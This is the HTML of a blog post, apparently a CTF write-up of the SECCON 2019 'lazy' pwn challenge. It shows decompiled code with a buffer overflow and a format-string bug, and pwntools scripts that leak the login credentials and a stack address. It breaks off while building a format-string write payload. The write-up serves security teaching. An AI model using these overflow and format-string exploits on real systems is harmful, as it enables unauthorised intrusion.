@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>lazy -- SECCON 2019 Online CTF - Pedro Bernardo</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Points: 332 (dynamic) Solves: 43
+TLDR Overflow to bypass login Exfiltrate all relevant files (challenge binary and libc) Format string to change the name of the file to be downloaded Format String to get leaks Buffer Overflow to build a ROP-chain and get a shell Recon and Reversing: In this challenge we are simply given the server host:port combination: lazy.chal.seccon.jp 33333
+Connecting to it with netcat, we get a menu with 3 options:" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="lazy -- SECCON 2019 Online CTF" />
+<meta property="og:description" content="Points: 332 (dynamic) Solves: 43
+TLDR Overflow to bypass login Exfiltrate all relevant files (challenge binary and libc) Format string to change the name of the file to be downloaded Format String to get leaks Buffer Overflow to build a ROP-chain and get a shell Recon and Reversing: In this challenge we are simply given the server host:port combination: lazy.chal.seccon.jp 33333
+Connecting to it with netcat, we get a menu with 3 options:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/blog/posts/2019-10-20-seccon19_lazy/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2019-10-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-10-20T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="lazy -- SECCON 2019 Online CTF"/>
+<meta name="twitter:description" content="Points: 332 (dynamic) Solves: 43
+TLDR Overflow to bypass login Exfiltrate all relevant files (challenge binary and libc) Format string to change the name of the file to be downloaded Format String to get leaks Buffer Overflow to build a ROP-chain and get a shell Recon and Reversing: In this challenge we are simply given the server host:port combination: lazy.chal.seccon.jp 33333
+Connecting to it with netcat, we get a menu with 3 options:"/>
+<script src="//localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="//localhost:1313/css/fonts.0db1b638c3c6b12e3f0bf5303b558492d936bf9102ec4c4ba2bdc315e2a4184f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"   />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="//localhost:1313/">Pedro Bernardo</a>
+	</div>
+	<nav>
+		
+		<a href="/blog">Blog</a>
+		
+		<a href="/blog/posts">All posts</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/">CV</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">lazy -- SECCON 2019 Online CTF</h1>
+			<div class="meta">Posted on Oct 20, 2019</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<p><strong>Points:</strong> 332 (dynamic)
+<strong>Solves:</strong> 43</p>
+<h2 id="tldr">TLDR</h2>
+<ol>
+<li>Overflow to bypass login</li>
+<li>Exfiltrate all relevant files (challenge binary and libc)
+<ul>
+<li>Format string to change the name of the file to be downloaded</li>
+</ul>
+</li>
+<li>Format String to get leaks</li>
+<li>Buffer Overflow to build a ROP-chain and get a shell</li>
+</ol>
+<h2 id="recon-and-reversing">Recon and Reversing:</h2>
+<p>In this challenge we are simply given the server host:port combination: <code>lazy.chal.seccon.jp 33333</code></p>
+<p>Connecting to it with netcat, we get a menu with 3 options:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>1: Public contents
+</span></span><span style="display:flex;"><span>2: Login
+</span></span><span style="display:flex;"><span>3: Exit
+</span></span></code></pre></div><p>Looking at the public contents, we see a few notes from the program author and one of them contains a C source code file called <code>login.c</code> which I assumed was the code that ran when we chose the <code>2.login</code> option.</p>
+<p>This is the login function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">login</span>(<span style="color:#ff7b72">void</span>){
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">char</span> username[BUFFER_LENGTH];
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">char</span> password[BUFFER_LENGTH];
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">char</span> input_username[BUFFER_LENGTH];
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">char</span> input_password[BUFFER_LENGTH];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">memset</span>(username,<span style="color:#a5d6ff">0x0</span>,BUFFER_LENGTH);
+</span></span><span style="display:flex;"><span>	<span style="color:#d2a8ff;font-weight:bold">memset</span>(password,<span style="color:#a5d6ff">0x0</span>,BUFFER_LENGTH);
+</span></span><span style="display:flex;"><span>	<span style="color:#d2a8ff;font-weight:bold">memset</span>(input_username,<span style="color:#a5d6ff">0x0</span>,BUFFER_LENGTH);
+</span></span><span style="display:flex;"><span>	<span style="color:#d2a8ff;font-weight:bold">memset</span>(input_password,<span style="color:#a5d6ff">0x0</span>,BUFFER_LENGTH);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">strcpy</span>(username,USERNAME);
+</span></span><span style="display:flex;"><span>	<span style="color:#d2a8ff;font-weight:bold">strcpy</span>(password,PASSWORD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;username : &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#d2a8ff;font-weight:bold">input</span>(input_username);
+</span></span><span style="display:flex;"><span>	<span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;Welcome, %s</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>,input_username);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;password : &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#d2a8ff;font-weight:bold">input</span>(input_password);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span>(<span style="color:#d2a8ff;font-weight:bold">strncmp</span>(username,input_username,<span style="color:#d2a8ff;font-weight:bold">strlen</span>(USERNAME)) <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#a5d6ff">0</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;Invalid username&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">if</span>(<span style="color:#d2a8ff;font-weight:bold">strncmp</span>(password,input_password,<span style="color:#d2a8ff;font-weight:bold">strlen</span>(PASSWORD)) <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#a5d6ff">0</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;Invalid password&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">1</span>;
+</span></span></code></pre></div><p>This logic seems fine, so let&rsquo;s look at the <code>input</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">input</span>(<span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>buf){
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> recv;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">while</span>(<span style="color:#a5d6ff">1</span>){
+</span></span><span style="display:flex;"><span>        recv <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#ff7b72">int</span>)<span style="color:#d2a8ff;font-weight:bold">read</span>(STDIN_FILENO,<span style="color:#ff7b72;font-weight:bold">&amp;</span>buf[i],<span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(recv <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;ERROR!&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(buf[i] <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#39;\n&#39;</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        i<span style="color:#ff7b72;font-weight:bold">++</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Ha ha! There&rsquo;s our overflow. The function will only stop reading when we encounter a <code>'\n'</code>.<br>
+I used this to leak the username and password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;A&#34;</span> <span style="color:#ff7b72;font-weight:bold">*</span> <span style="color:#a5d6ff">31</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>username : Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>3XPL01717
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;A&#34;</span> <span style="color:#ff7b72;font-weight:bold">*</span> <span style="color:#a5d6ff">63</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>username : Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>_H4CK3R_
+</span></span></code></pre></div><p>So, we have <code>username = &quot;_H4CK3R_&quot;</code> and <code>password = &quot;3XPL01717&quot;</code></p>
+<p>After the login, we are presented with one more option: <code>4: Manage</code>.<br>
+Selecting it shows us the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>Welcome to private directory
+</span></span><span style="display:flex;"><span>You can download contents <span style="color:#ff7b72;font-weight:bold">in</span> this directory, but you can<span style="color:#a5d6ff">&#39;t download contents with a dot in the name</span>
+</span></span><span style="display:flex;"><span>lazy
+</span></span><span style="display:flex;"><span>libc<span style="color:#ff7b72;font-weight:bold">.</span>so<span style="color:#ff7b72;font-weight:bold">.</span><span style="color:#a5d6ff">6</span>
+</span></span><span style="display:flex;"><span><span style="color:#f0883e;font-weight:bold">Input</span> file name
+</span></span></code></pre></div><p>So I downloaded <code>lazy</code> and started analyzing the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>╭─vagrant@ubuntu-bionic ~/share/seccon19/pwn/lazy
+</span></span><span style="display:flex;"><span>╰─$ file lazy
+</span></span><span style="display:flex;"><span>lazy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=21cd58cd5cf177c5dbd0f8259760130d8e6b0795, not stripped
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─vagrant@ubuntu-bionic ~/share/seccon19/pwn/lazy
+</span></span><span style="display:flex;"><span>╰─$ checksec lazy
+</span></span><span style="display:flex;"><span>[*] &#39;/home/vagrant/share/seccon19/pwn/lazy/lazy&#39;
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE (0x400000)
+</span></span></code></pre></div><p>Reversing the binary, we can verify that it&rsquo;s exactly what&rsquo;s running on the server.
+The <code>input</code> function used in the aforementioned login function is also used to ask user input in other areas of the code, so we have other possibly exploitable overflows.</p>
+<p>In the <code>filter</code> function (function that processes the <code>4: Manage</code> menu option), we have the following code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">char</span> s[<span style="color:#a5d6ff">8</span>];      <span style="color:#8b949e;font-style:italic">// [sp+0h] [bp-20h]@1
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#ff7b72">__int64</span> v3;     <span style="color:#8b949e;font-style:italic">// [sp+8h] [bp-18h]@1
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#ff7b72">int</span> v4;         <span style="color:#8b949e;font-style:italic">// [sp+10h] [bp-10h]@1
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#ff7b72">__int64</span> cookie; <span style="color:#8b949e;font-style:italic">// [sp+18h] [bp-8h]@1
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;You can download contents in this directory, but you can&#39;t download contents with a dot in the name&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">listing</span>(<span style="color:#a5d6ff">&#34;You can download contents in this directory, but you can&#39;t download contents with a dot in the name&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;Input file name&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">input</span>(s);
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> ( <span style="color:#d2a8ff;font-weight:bold">strchr</span>(s, <span style="color:#a5d6ff">&#39;.&#39;</span>) ) {
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;NO! You can not download this file!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;Filename : &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">printf</span>(s);
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;OK! Downloading...&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">download</span>(s);
+</span></span></code></pre></div><p>Here are two exploitable vulnerabilities:</p>
+<ol>
+<li>Buffer overflow in the <code>s</code> buffer</li>
+<li>Format String vulnerability when printing the file name</li>
+</ol>
+<h2 id="exploitation-plan">Exploitation plan</h2>
+<p>We saw previously the binary has no <strong>PIE</strong>, but has <strong>FULL RELRO</strong> so it&rsquo;s impossible to overwrite the <strong>GOT</strong>. We can still use the GOT to get libc leaks, tho.</p>
+<p>This limits our exploitation options. We can use the buffer overflow to control the RIP by overwriting the saved RIP on the stack, but we have to bypass the <code>stack canary</code>. Luckily, we can leak it with our format string. But where would we return to? The perfect solution would be a ret2libc attack, but we don&rsquo;t know the libc that is used and we can&rsquo;t just download it since the program checks for <code>.</code> in the filename before calling the <code>download</code> function.</p>
+<p>This <code>download</code> is pretty straightforward and only does a couple of security checks:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">if</span> ( <span style="color:#d2a8ff;font-weight:bold">strlen</span>(file_name) <span style="color:#ff7b72;font-weight:bold">&gt;</span> <span style="color:#a5d6ff">27</span> ){
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;Too long!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> ( <span style="color:#d2a8ff;font-weight:bold">strstr</span>(file_name, <span style="color:#a5d6ff">&#34;..&#34;</span>) ){
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;No directory traversal!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>file_len <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">strlen</span>(file_name);
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">strncat</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>dest, file_name, file_len <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>fd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>dest, <span style="color:#a5d6ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>dest);
+</span></span></code></pre></div><p>Then it just sends us the file contents.</p>
+<h2 id="getting-the-libc">Getting the Libc</h2>
+<p>With a few tests, I figured out that our input is at offset 6 from the <code>printf(s)</code>, so we could access our input directly via the positional argument <code>&quot;%6$s&quot;</code>.
+We can also offset the saved EBP in the stack and leak it by using the <code>&quot;%10$p&quot;</code> format. With this, we can calculate the address of our input on the stack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;_H4CK3R_&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;3XPL01717&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak_to_input_offset <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x60</span>
+</span></span><span style="display:flex;"><span>leak_fmt <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;%10$p&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(leak_fmt)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#a5d6ff">&#34;Filename : &#34;</span>)
+</span></span><span style="display:flex;"><span>leak <span style="color:#ff7b72;font-weight:bold">=</span> int(s<span style="color:#ff7b72;font-weight:bold">.</span>recvline()<span style="color:#ff7b72;font-weight:bold">.</span>strip(), <span style="color:#a5d6ff">16</span>)
+</span></span><span style="display:flex;"><span>input_addr <span style="color:#ff7b72;font-weight:bold">=</span> leak <span style="color:#ff7b72;font-weight:bold">-</span> leak_to_input_offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;leak = </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(leak)))
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;input @ </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(input_addr)))
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>╭─vagrant@ubuntu-bionic ~/share/seccon19/pwn/lazy
+</span></span><span style="display:flex;"><span>╰─$ python exploit_leaks.py remote
+</span></span><span style="display:flex;"><span>[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done
+</span></span><span style="display:flex;"><span>[*] leak = 0x7ffe4ee73ce0
+</span></span><span style="display:flex;"><span>[*] input @ 0x7ffe4ee73c80
+</span></span></code></pre></div><p>So, my goal is to give the program a format string that will modify itself to be &ldquo;libc.so.6\x00&rdquo;.
+Since the <code>download</code> function copies <code>strlen(file_name) - 1</code> bytes, we will have to write &ldquo;libc.so.6X\x00&rdquo;, X being any byte != &lsquo;\x00&rsquo;.<br>
+I used my <em>in development</em> format string library to help me calculating the paddings, but I had to edit the payload manually for it to work properly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># addresses to write on</span>
+</span></span><span style="display:flex;"><span>sequence <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>join([p64(input_addr<span style="color:#ff7b72;font-weight:bold">+</span>i) <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">8</span>)])
+</span></span><span style="display:flex;"><span>sequence <span style="color:#ff7b72;font-weight:bold">+=</span> p64(input_addr<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fs <span style="color:#ff7b72;font-weight:bold">=</span> FormatString()
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># first address will be at offset 23 (%23$hhn)</span>
+</span></span><span style="display:flex;"><span>fs<span style="color:#ff7b72;font-weight:bold">.</span>write(<span style="color:#a5d6ff">23</span>, u64(<span style="color:#a5d6ff">&#34;libc.so.&#34;</span>), step<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> fs<span style="color:#ff7b72;font-weight:bold">.</span>payload()
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># this is a dirty hack, but it got the job done</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#a5d6ff">&#34;%&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> str(<span style="color:#a5d6ff">0x3636</span> <span style="color:#ff7b72;font-weight:bold">-</span> fs<span style="color:#ff7b72;font-weight:bold">.</span>bytes_written_so_far) <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;x&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;%31$n&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># pad the input so the the addresses are in a known  </span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># location at a specific offset</span>
